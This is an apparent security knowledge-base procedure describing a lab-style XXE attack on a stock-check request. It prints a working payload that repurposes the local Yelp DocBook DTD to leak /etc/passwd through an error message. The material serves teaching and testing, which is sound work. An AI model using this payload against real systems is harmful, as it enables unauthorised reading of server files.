---
id: cf5a2f9e-7234-4917-8265-2480962698dd
name: XXE to Retrieve Data by Repurposing a Local DTD
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T19:13:50.343273+00:00'
updated_at: '2023-05-26T01:26:41.957670+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
- '[[xxe]]'
---

# XXE to Retrieve Data by Repurposing a Local DTD

**Status**: ✓ Verified

## Summary

Modifying an XML request to add an external entity that results in an error message. The error message reveals sensitive information along with it. 

## Description

# Description

Modifying an XML request to add an external entity that results in an error message. The error message reveals sensitive information along with it.

# Procedure

1. Access the product page and click on check stock. Intercept the request in Burp Suite.

2. Insert the below parameter entity definition between the XML declaration and the *stockCheck* element.

*`<!DOCTYPE message [`
 `<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`
 `<!ENTITY % ISOamso '`
 `<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">`
 `<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">`
 `&#x25;eval;`
 `&#x25;error;`
 `'>`
* `%local_dtd;`
 `]>`

3. This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.

## Platforms

- Web

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
- [[xxe]]
